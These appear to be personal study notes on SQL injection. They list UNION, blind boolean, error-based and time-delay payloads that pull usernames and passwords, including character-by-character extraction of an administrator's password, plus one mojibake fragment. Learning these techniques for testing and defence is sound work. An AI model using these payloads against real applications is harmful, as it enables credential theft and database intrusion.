Simple sql injection (NO spcaces use `+` instead between string )
========================
Submitting the single quote character ' and looking for errors or other anomalies.

	In UPDATE statements, within the updated values or the WHERE clause.
	In INSERT statements, within the inserted values.
	In SELECT statements, within the table or column name.
		`'`
		`'--`
		`' UNION SELECT username, password FROM users--`
			For a UNION query to work, two key requirements must be met:
				The individual queries must return the same number of columns.
					`' ORDER BY 1--` and increase the # on by one
					`' UNION SELECT NULL--` and then increase the no of null one by one
						in url it would be like `' UNION + Select + NULL, NULL --
				The data types in each column must be compatible between the individual queries.
					`' UNION SELECT 'a',NULL,NULL,NULL--` and shift the datatype one by one like `' UNION SELECT NULL,'a',NULL,NULL--`
					on oracle we could concatenate the columns `' UNION SELECT username || '~' || password FROM users--`
	
	In SELECT statements, within the ORDER BY clause.


Blind sql injection
======================

Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic 
differences in the resulting application responses.



Submitting Boolean conditions such as OR 1=1 and OR 1=2, and looking for differences in the application's responses.
	`' AND (select SUBSTR(password,21,1) from users limit 1)='ยงaยง`
	`xyz' AND 'b'='a`
	`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
	`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

	`CAST((SELECT example_column FROM example_table) AS int)`
	

Submitting payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.

	`'; IF (1=2) WAITFOR DELAY '0:0:10'--`
		e.g. '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--




Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions.
